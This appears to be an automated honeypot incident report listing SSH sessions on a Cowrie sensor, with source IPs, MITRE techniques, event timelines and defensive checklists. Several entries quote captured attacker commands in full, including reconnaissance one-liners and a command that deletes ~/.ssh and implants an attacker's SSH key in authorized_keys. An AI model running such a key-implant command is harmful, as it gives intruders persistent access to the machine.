| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:17:40` | `cowrie.session.connect` |
| `2026-07-17 04:17:40` | `cowrie.client.version` |
| `2026-07-17 04:17:40` | `cowrie.client.kex` |
| `2026-07-17 04:17:41` | `cowrie.login.success` |
| `2026-07-17 04:17:42` | `cowrie.session.params` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.success` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.command.input` |
| `2026-07-17 04:17:42` | `cowrie.log.closed` |
| `2026-07-17 04:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad03a7222ef6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 04:17 |
| **Last Seen** | 2026-07-17 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:17:47` | `cowrie.session.connect` |
| `2026-07-17 04:17:47` | `cowrie.client.version` |
| `2026-07-17 04:17:47` | `cowrie.client.kex` |
| `2026-07-17 04:17:48` | `cowrie.login.success` |
| `2026-07-17 04:17:49` | `cowrie.session.params` |
| `2026-07-17 04:17:49` | `cowrie.command.input` |
| `2026-07-17 04:17:49` | `cowrie.log.closed` |
| `2026-07-17 04:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8932617c0eb0

| Field | Detail |
|---|---|
| **Source IP** | `104.155.43[.]49` |
| **First Seen** | 2026-07-17 04:17 |
| **Last Seen** | 2026-07-17 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:17:52` | `cowrie.session.connect` |
| `2026-07-17 04:17:52` | `cowrie.login.success` |
| `2026-07-17 04:17:52` | `cowrie.session.params` |
| `2026-07-17 04:17:52` | `cowrie.command.input` |
| `2026-07-17 04:17:52` | `cowrie.command.failed` |
| `2026-07-17 04:17:59` | `cowrie.log.closed` |
| `2026-07-17 04:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.43[.]49` to AbuseIPDB if not already reported
- [ ] Block `104.155.43[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f62cb90db4a

| Field | Detail |
|---|---|
| **Source IP** | `104.155.43[.]49` |
| **First Seen** | 2026-07-17 04:17 |
| **Last Seen** | 2026-07-17 04:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:17:53` | `cowrie.session.connect` |
| `2026-07-17 04:17:54` | `cowrie.login.success` |
| `2026-07-17 04:17:54` | `cowrie.session.params` |
| `2026-07-17 04:17:54` | `cowrie.command.input` |
| `2026-07-17 04:17:59` | `cowrie.log.closed` |
| `2026-07-17 04:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.43[.]49` to AbuseIPDB if not already reported
- [ ] Block `104.155.43[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912430bc724b

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-07-17 04:18 |
| **Last Seen** | 2026-07-17 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:18:07` | `cowrie.session.connect` |
| `2026-07-17 04:18:07` | `cowrie.client.version` |
| `2026-07-17 04:18:07` | `cowrie.client.kex` |
| `2026-07-17 04:18:09` | `cowrie.login.success` |
| `2026-07-17 04:18:09` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2af71039608

| Field | Detail |
|---|---|
| **Source IP** | `51.116.117[.]203` |
| **First Seen** | 2026-07-17 04:18 |
| **Last Seen** | 2026-07-17 04:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:18:14` | `cowrie.session.connect` |
| `2026-07-17 04:18:15` | `cowrie.client.version` |
| `2026-07-17 04:18:15` | `cowrie.client.kex` |
| `2026-07-17 04:18:15` | `cowrie.login.success` |
| `2026-07-17 04:18:16` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.116.117[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.116.117[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b0d898d501

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:19 |
| **Last Seen** | 2026-07-17 04:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:19:38` | `cowrie.session.connect` |
| `2026-07-17 04:19:38` | `cowrie.client.version` |
| `2026-07-17 04:19:39` | `cowrie.client.kex` |
| `2026-07-17 04:19:39` | `cowrie.login.success` |
| `2026-07-17 04:19:40` | `cowrie.session.params` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.success` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.command.input` |
| `2026-07-17 04:19:40` | `cowrie.log.closed` |
| `2026-07-17 04:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6313f6a563

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:21 |
| **Last Seen** | 2026-07-17 04:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:21:36` | `cowrie.session.connect` |
| `2026-07-17 04:21:36` | `cowrie.client.version` |
| `2026-07-17 04:21:36` | `cowrie.client.kex` |
| `2026-07-17 04:21:37` | `cowrie.login.success` |
| `2026-07-17 04:21:38` | `cowrie.session.params` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.success` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:38` | `cowrie.command.input` |
| `2026-07-17 04:21:39` | `cowrie.log.closed` |
| `2026-07-17 04:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c923b83c46

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:23 |
| **Last Seen** | 2026-07-17 04:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:23:28` | `cowrie.session.connect` |
| `2026-07-17 04:23:28` | `cowrie.client.version` |
| `2026-07-17 04:23:28` | `cowrie.client.kex` |
| `2026-07-17 04:23:30` | `cowrie.login.success` |
| `2026-07-17 04:23:31` | `cowrie.session.params` |
| `2026-07-17 04:23:31` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.success` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.command.input` |
| `2026-07-17 04:23:32` | `cowrie.log.closed` |
| `2026-07-17 04:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5dee8d9e7f4

| Field | Detail |
|---|---|
| **Source IP** | `195.25.75[.]65` |
| **First Seen** | 2026-07-17 04:23 |
| **Last Seen** | 2026-07-17 04:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:23:28` | `cowrie.session.connect` |
| `2026-07-17 04:23:28` | `cowrie.client.version` |
| `2026-07-17 04:23:29` | `cowrie.client.kex` |
| `2026-07-17 04:23:29` | `cowrie.login.success` |
| `2026-07-17 04:23:30` | `cowrie.session.params` |
| `2026-07-17 04:23:30` | `cowrie.command.input` |
| `2026-07-17 04:23:30` | `cowrie.command.failed` |
| `2026-07-17 04:23:30` | `cowrie.log.closed` |
| `2026-07-17 04:23:31` | `cowrie.session.params` |
| `2026-07-17 04:23:31` | `cowrie.command.input` |
| `2026-07-17 04:23:31` | `cowrie.session.file_download` |
| `2026-07-17 04:23:31` | `cowrie.log.closed` |
| `2026-07-17 04:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.25.75[.]65` to AbuseIPDB if not already reported
- [ ] Block `195.25.75[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd84ef044b8

| Field | Detail |
|---|---|
| **Source IP** | `195.25.75[.]65` |
| **First Seen** | 2026-07-17 04:23 |
| **Last Seen** | 2026-07-17 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:23:32` | `cowrie.session.connect` |
| `2026-07-17 04:23:32` | `cowrie.client.version` |
| `2026-07-17 04:23:32` | `cowrie.client.kex` |
| `2026-07-17 04:23:32` | `cowrie.login.success` |
| `2026-07-17 04:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.25.75[.]65` to AbuseIPDB if not already reported
- [ ] Block `195.25.75[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540b441b2e0d

| Field | Detail |
|---|---|
| **Source IP** | `195.25.75[.]65` |
| **First Seen** | 2026-07-17 04:23 |
| **Last Seen** | 2026-07-17 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:23:32` | `cowrie.session.connect` |
| `2026-07-17 04:23:32` | `cowrie.client.version` |
| `2026-07-17 04:23:32` | `cowrie.client.kex` |
| `2026-07-17 04:23:33` | `cowrie.login.success` |
| `2026-07-17 04:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.25.75[.]65` to AbuseIPDB if not already reported
- [ ] Block `195.25.75[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe98d1cf664

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:25 |
| **Last Seen** | 2026-07-17 04:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:25:06` | `cowrie.session.connect` |
| `2026-07-17 04:25:06` | `cowrie.client.version` |
| `2026-07-17 04:25:06` | `cowrie.client.kex` |
| `2026-07-17 04:25:08` | `cowrie.login.success` |
| `2026-07-17 04:25:09` | `cowrie.session.params` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.success` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.command.input` |
| `2026-07-17 04:25:09` | `cowrie.log.closed` |
| `2026-07-17 04:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128d8187b124

| Field | Detail |
|---|---|
| **Source IP** | `88.99.224[.]40` |
| **First Seen** | 2026-07-17 04:25 |
| **Last Seen** | 2026-07-17 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:25:09` | `cowrie.session.connect` |
| `2026-07-17 04:25:09` | `cowrie.client.version` |
| `2026-07-17 04:25:09` | `cowrie.client.kex` |
| `2026-07-17 04:25:10` | `cowrie.login.success` |
| `2026-07-17 04:25:11` | `cowrie.session.params` |
| `2026-07-17 04:25:11` | `cowrie.command.input` |
| `2026-07-17 04:25:11` | `cowrie.command.failed` |
| `2026-07-17 04:25:11` | `cowrie.log.closed` |
| `2026-07-17 04:25:11` | `cowrie.session.params` |
| `2026-07-17 04:25:11` | `cowrie.command.input` |
| `2026-07-17 04:25:12` | `cowrie.session.file_download` |
| `2026-07-17 04:25:12` | `cowrie.log.closed` |
| `2026-07-17 04:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.99.224[.]40` to AbuseIPDB if not already reported
- [ ] Block `88.99.224[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee0682851b1

| Field | Detail |
|---|---|
| **Source IP** | `88.99.224[.]40` |
| **First Seen** | 2026-07-17 04:25 |
| **Last Seen** | 2026-07-17 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:25:12` | `cowrie.session.connect` |
| `2026-07-17 04:25:12` | `cowrie.client.version` |
| `2026-07-17 04:25:12` | `cowrie.client.kex` |
| `2026-07-17 04:25:12` | `cowrie.login.success` |
| `2026-07-17 04:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.99.224[.]40` to AbuseIPDB if not already reported
- [ ] Block `88.99.224[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb584518838

| Field | Detail |
|---|---|
| **Source IP** | `88.99.224[.]40` |
| **First Seen** | 2026-07-17 04:25 |
| **Last Seen** | 2026-07-17 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:25:12` | `cowrie.session.connect` |
| `2026-07-17 04:25:12` | `cowrie.client.version` |
| `2026-07-17 04:25:13` | `cowrie.client.kex` |
| `2026-07-17 04:25:13` | `cowrie.login.success` |
| `2026-07-17 04:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.99.224[.]40` to AbuseIPDB if not already reported
- [ ] Block `88.99.224[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082ea144af02

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:26 |
| **Last Seen** | 2026-07-17 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:26:48` | `cowrie.session.connect` |
| `2026-07-17 04:26:48` | `cowrie.client.version` |
| `2026-07-17 04:26:48` | `cowrie.client.kex` |
| `2026-07-17 04:26:49` | `cowrie.login.success` |
| `2026-07-17 04:26:50` | `cowrie.session.params` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.success` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:50` | `cowrie.command.input` |
| `2026-07-17 04:26:51` | `cowrie.log.closed` |
| `2026-07-17 04:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df43cae2c087

| Field | Detail |
|---|---|
| **Source IP** | `118.91.176[.]243` |
| **First Seen** | 2026-07-17 04:28 |
| **Last Seen** | 2026-07-17 04:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:28:30` | `cowrie.session.connect` |
| `2026-07-17 04:28:30` | `cowrie.client.version` |
| `2026-07-17 04:28:30` | `cowrie.client.kex` |
| `2026-07-17 04:28:32` | `cowrie.login.success` |
| `2026-07-17 04:28:33` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.91.176[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.91.176[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
